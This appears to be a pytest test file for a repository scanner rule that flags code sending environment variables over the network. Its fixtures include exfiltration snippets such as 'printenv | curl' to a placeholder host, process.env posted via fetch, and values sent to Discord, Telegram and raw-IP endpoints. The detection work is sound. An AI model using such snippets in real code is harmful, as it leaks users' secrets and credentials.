from repoguard.scanner import scan_files

RULE_ID = "ENV-EXFIL"


def scan_one(path, content):
    return [f for f in scan_files([(path, content)]) if f.rule_id == RULE_ID]


def sev(path, content):
    return [f.severity for f in scan_one(path, content)]


# --- high: the whole environment -------------------------------------------------------

def test_js_stringify_env_in_fetch_is_high():
    code = 'fetch("https://example.test/c", { method: "POST", body: JSON.stringify(process.env) });\n'
    assert sev("a.js", code) == ["high"]


def test_js_env_dump_on_a_nearby_line_is_high():
    code = "const data = JSON.stringify(process.env);\n\nfetch(url, { body: data });\n"
    found = scan_one("a.js", code)
    assert [f.severity for f in found] == ["high"]
    assert found[0].line == 3  # the network call


def test_js_object_keys_and_spread_are_dumps():
    assert sev("a.js", "const k = Object.keys(process.env);\nfetch(u, {body: k});\n") == ["high"]
    assert sev("a.js", "const e = { ...process.env };\nfetch(u, {body: e});\n") == ["high"]


def test_python_dict_of_environ_is_high():
    assert sev("a.py", "requests.post(url, data=dict(os.environ))\n") == ["high"]
    assert sev("a.py", "e = os.environ.copy()\nrequests.post(url, json=e)\n") == ["high"]


def test_printenv_piped_to_curl_is_high():
    assert sev("run.sh", "printenv | curl -X POST -d @- https://example.test/c\n") == ["high"]


# --- high: known collection address ----------------------------------------------------

def test_named_env_to_discord_webhook_is_high():
    code = (
        'const hook = "https://discord.com/api/webhooks/1/abc";\n'
        "fetch(hook, { body: process.env.USERNAME });\n"
    )
    assert sev("a.js", code) == ["high"]


def test_named_env_to_telegram_bot_is_high():
    code = 'requests.get("https://api.telegram.org/bot123/send?text=" + os.environ.get("USER"))\n'
    assert sev("a.py", code) == ["high"]


def test_public_raw_ip_counts_but_loopback_does_not():
    bad = 'fetch("http://203.0.113.5/x?d=" + process.env.USER);\n'
    ok = 'fetch("http://127.0.0.1:3000/x?d=" + process.env.USER);\n'
    assert sev("a.js", bad) == ["high"]
    assert sev("a.js", ok) == []


# --- low: secret-looking names ---------------------------------------------------------

def test_secret_named_variable_near_network_is_low():
    code = 'fetch(url, { headers: { Authorization: process.env.API_TOKEN } });\n'
    assert sev("a.js", code) == ["low"]


# --- window ----------------------------------------------------------------------------

def test_dump_far_from_network_is_fine():
    code = "const e = JSON.stringify(process.env);\n" + "\n" * 15 + "fetch(url);\n"
    assert sev("a.js", code) == []


def test_dump_exactly_at_the_window_edge_is_flagged():
    code = "const e = JSON.stringify(process.env);\n" + "\n" * 9 + "fetch(url);\n"
    assert sev("a.js", code) == ["high"]  # lines 1 and 11 -> distance 10


# --- benign ----------------------------------------------------------------------------

def test_named_config_and_fetch_is_fine():
    code = "app.listen(process.env.PORT);\nconst r = await fetch(apiUrl);\n"
    assert sev("a.js", code) == []


def test_destructuring_env_is_fine():
    assert sev("a.js", "const { HOST, PORT } = process.env;\nfetch(url);\n") == []


def test_in_os_environ_check_is_fine():
    assert sev("a.py", 'if "DEBUG" in os.environ:\n    requests.get(url)\n') == []


def test_os_environ_get_and_index_are_fine():
    assert sev("a.py", 'p = os.environ.get("PORT")\nrequests.get(url)\n') == []
    assert sev("a.py", 'p = os.environ["PORT"]\nrequests.get(url)\n') == []


def test_env_without_network_is_fine():
    assert sev("a.js", "console.log(JSON.stringify(process.env));\n") == []


def test_network_without_env_is_fine():
    assert sev("a.js", "fetch('https://api.example.test/x');\n") == []


def test_documentation_files_are_skipped():
    assert sev("README.md", "fetch(u, { body: JSON.stringify(process.env) })\n") == []


def test_empty_file_does_not_crash():
    assert sev("a.js", "") == []
